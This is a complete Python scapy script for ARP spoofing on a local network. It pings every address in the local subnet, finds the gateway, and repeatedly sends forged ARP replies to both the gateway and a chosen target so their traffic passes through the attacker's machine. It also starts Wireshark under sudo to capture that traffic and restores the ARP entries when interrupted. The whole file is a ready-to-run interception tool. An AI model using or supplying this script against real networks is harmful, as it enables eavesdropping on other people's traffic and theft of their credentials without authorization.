import time
import socket, struct
import os
import multiprocessing
import subprocess

from scapy.all import *



def get_mac(ip):
    arp_request = ARP(pdst = ip)
    broadcast = Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    packet = ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
    send(packet, verbose = False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    send(packet, verbose = False)


def get_default_gateway():
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                continue
            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))


def pinger(job_q, results_q):
    DEVNULL = open(os.devnull, 'w')
    while True:
        ip = job_q.get()
        if ip is None:
            break
        try:
            subprocess.check_call(['ping', '-c1', ip], stdout=DEVNULL)
            results_q.put(ip)
        except:
            pass


def get_my_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip


def map_network(pool_size=255):
    ip_list = list()
    ip_parts = get_my_ip().split('.')
    base_ip = ip_parts[0] + '.' + ip_parts[1] + '.' + ip_parts[2] + '.'
    jobs = multiprocessing.Queue()
    results = multiprocessing.Queue()
    pool = [multiprocessing.Process(target=pinger, args=(jobs, results)) for i in range(pool_size)]
    for p in pool:
        p.start()
    for i in range(1, 255):
        jobs.put(base_ip + '{0}'.format(i))
    for p in pool:
        jobs.put(None)
    for p in pool:
        p.join()
    while not results.empty():
        ip = results.get()
        ip_list.append(ip)
    return ip_list


def main():
    print ('Welcome to spoofing')
    print('Mapping...')
    lst = map_network()
    print(lst)
    gateway_ip = get_default_gateway()
    target_ip = input ('Enter your target IP from the list:\n')
    TIME = float(input('Enter how often you want to spoof, sec:\n'))
    os.system("sudo wireshark&") 
    try:
        sent_packets_count = 0
        print (f'\nmac_address >> {get_mac(target_ip)}\n\n')
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count = sent_packets_count + 2
            print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
            time.sleep(TIME) # Waits for two seconds
    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        restore(gateway_ip, target_ip)
        restore(target_ip, gateway_ip)
        print("[+] Arp Spoof Stopped")



if __name__=="__main__":
    main()
